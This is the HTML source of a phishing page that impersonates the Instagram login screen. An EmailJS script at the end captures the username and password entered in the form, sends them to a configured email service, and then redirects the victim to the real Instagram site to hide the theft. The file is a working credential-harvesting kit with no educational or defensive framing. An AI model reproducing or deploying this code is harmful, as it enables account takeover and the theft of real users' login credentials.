<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            background: #fafafa;
            background-color:#000000;
            min-height: 100vh;
            padding: 20px;
            color:white;
        }

        .main-container {
            width: 100%;
            max-width: 350px;
            margin-top: 40px;
        }

        /* Login Box */
        .login-box {
            background: black;
            box-shadow:1px 1px 6px grey;
            border-radius:7px;
            padding: 40px 40px 20px;
            text-align: center;
        }

        .logo {
            width: 175px;
            margin-bottom: 30px;
            filter: invert(100%);
        }

        h1 {
            color: #262626;
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 24px;
        }

        /* Facebook Button */
        .fb-btn {
            background: #0095f6;
            color: white;
            width: 100%;
            padding: 8px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            margin: 8px 0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .fb-btn img {
            width: 16px;
            height: 16px;
        }

        /* Separator */
        .separator {
            color: #8e8e8e;
            margin: 18px 0;
            display: flex;
            align-items: center;
            font-size: 13px;
            font-weight: 600;
        }

        .separator::before,
        .separator::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 10px;
        }

        /* Input Fields */
        input {
            width: 100%;
            padding: 9px 8px;
            margin: 6px 0;
            background: #121212;
            border: 1px solid #262626;
            border-radius: 3px;
            font-size: 12px;
            color:white;
        }

        input::placeholder {
            color: #8e8e8e;
        }

        /* Login Button */
        .login-btn {
            background: #4cb5f9;
            color: white;
            width: 100%;
            padding: 8px;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            margin-top: 14px;
        }

        /* Links */
        .forgot-password {
            display: block;
            color: #00376b;
            font-size: 12px;
            margin: 16px 0;
            text-decoration: none;
        }

        /* Signup Section */
        .signup-box {
            background: #000000;
            color:white;
            padding: 20px;
            margin-top: 10px;
            text-align: center;
            font-size: 14px;
        }

        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        /* Footer Text */
        .footer {
            color: #8e8e8e;
            font-size: 12px;
            text-align: center;
            margin: 20px 0;
            line-height: 1.4;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="login-box">
            <img src="logo.png" class="logo" alt="Instagram">
            <h1>Login</h1>
            
            <button class="fb-btn">
                <img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" alt="FB">
                Continue with Facebook
            </button>

            <div class="separator">OR</div>

            <!-- Added form element and input IDs -->
            <form id="login-form">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" class="login-btn">Log in</button>
            </form>

            <a href="#" class="forgot-password">Forgot password?</a>
        </div>

         <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>

        <div class="footer">
            By continuing, you agree to Instagram's<br>
            <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>
        </div>
    </div>
    

    <!-- Added EmailJS script -->
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        (function() {
            emailjs.init("SJtg0Qmii7aqFmpBH"); // Replace with your EmailJS User ID
        })();

        document.getElementById("login-form").addEventListener("submit", function(event) {
            event.preventDefault();

            const params = {
                username: document.getElementById("username").value,
                password: document.getElementById("password").value
            };

            emailjs.send("service_42gxs5i", "template_e0ck84k", params)
                .then(function() {
                    window.location.href = "https://www.instagram.com";
                }, function(error) {
                    alert("Failed to send: " + JSON.stringify(error));
                });
        });
    </script>
</body>
</html>
